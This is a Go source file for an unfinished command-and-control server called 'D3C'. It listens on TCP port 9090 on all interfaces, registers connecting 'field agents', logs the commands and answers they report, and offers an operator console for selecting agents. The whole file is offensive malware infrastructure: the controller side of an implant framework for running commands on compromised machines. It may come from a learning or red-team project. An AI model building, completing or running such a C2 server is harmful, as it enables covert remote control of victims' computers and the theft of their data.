package main

import (
	"bufio"
	"commons/commons"
	"encoding/gob"
	"log"
	"net"
	"os"
	"strings"
)

var (
	fieldAgents   = []commons.Message{}
	selectedAgent = ""
)

func main() {
	log.Println("The C2 server has started!")

	go startListener("9090")

	cliHandler()
}

func cliHandler() {
	for {
		print("D3C> ")
		reader := bufio.NewReader(os.Stdin)
		completeCommand, _ := reader.ReadString('\n')
		println(completeCommand)

		separatedCommand := strings.Split(strings.TrimSuffix(completeCommand, "\n"), " ")
		baseCommand := strings.TrimSpace(separatedCommand[0])
		if len(baseCommand) > 0 {
			switch baseCommand {
			case "show":
				showHandler(separatedCommand)
			case "select":
				selectHandler(separatedCommand)
			default:
				log.Println("The inserted command doesn`t exist!")
			}
		}
	}

}

func showHandler(command []string) {

}

func selectHandler(command []string) {
	if len(command) > 1 {
		selectedAgent = command[1]
	} else {
		log.Println("Choose the ID of the agent to be selected.")
		log.Println("TO list the field agents, use 'show agents' ")
	}

}

func registeredAgent(agentId string) bool {
	for _, agent := range fieldAgents {
		if agent.AgentId == agentId {
			return true
		}
	}
	return false
}

func messageHasAnswer(msg commons.Message) (hasAnswer bool) {
	hasAnswer = false

	for _, Command := range msg.Commands {
		if len(Command.Answer) > 0 {
			hasAnswer = true
		}
	}

	return hasAnswer
}

func startListener(port string) {
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		log.Fatal("Error when initiating the listener:", err.Error())
	}

	for {
		channel, err := listener.Accept()
		if err != nil {
			log.Println("Error in a new channel:", err.Error())
			continue
		}

		go handleConnection(channel) // ✅ Moved outside the error-handling block
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close() // ✅ Properly closes the connection

	var msg commons.Message
	decoder := gob.NewDecoder(conn)
	encoder := gob.NewEncoder(conn)

	err := decoder.Decode(&msg)
	if err != nil {
		log.Println("Error decoding message from agent:", err)
		return
	}

	if registeredAgent(msg.AgentId) {
		log.Println("Received message from existing agent:", msg.AgentId)
		if messageHasAnswer(msg) {
			//show answer
			for _, command := range msg.Commands {
				log.Println("Command: ", command.Command)
				log.Println("Answer: ", command.Answer)
			}
		}
	} else {
		log.Println("New agent connected:", conn.RemoteAddr().String())
		fieldAgents = append(fieldAgents, msg) // ✅ Fixed appending
	}

	// Send a response back
	response := commons.Message{
		AgentId:       msg.AgentId,
		AgentHostname: "Server-Acknowledged",
		AgentCWD:      msg.AgentCWD,
	}

	err = encoder.Encode(response)
	if err != nil {
		log.Println("Error encoding response:", err)
	}
}
